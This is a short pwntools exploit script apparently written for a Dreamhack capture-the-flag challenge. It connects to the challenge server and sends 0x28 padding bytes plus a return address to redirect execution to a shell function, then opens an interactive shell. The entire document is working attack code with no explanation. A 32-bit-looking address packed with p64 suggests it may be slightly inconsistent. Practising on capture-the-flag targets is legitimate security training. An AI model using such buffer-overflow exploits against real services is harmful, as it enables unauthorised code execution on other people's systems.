from pwn import *

HOST, PORT = '0.0.0.0', 31337
HOST, PORT = 'host3.dreamhack.games', 17616
r = remote(HOST, PORT)

sh=0x804867b
r.sendline(b'A'*0x28 + p64(sh))

r.interactive()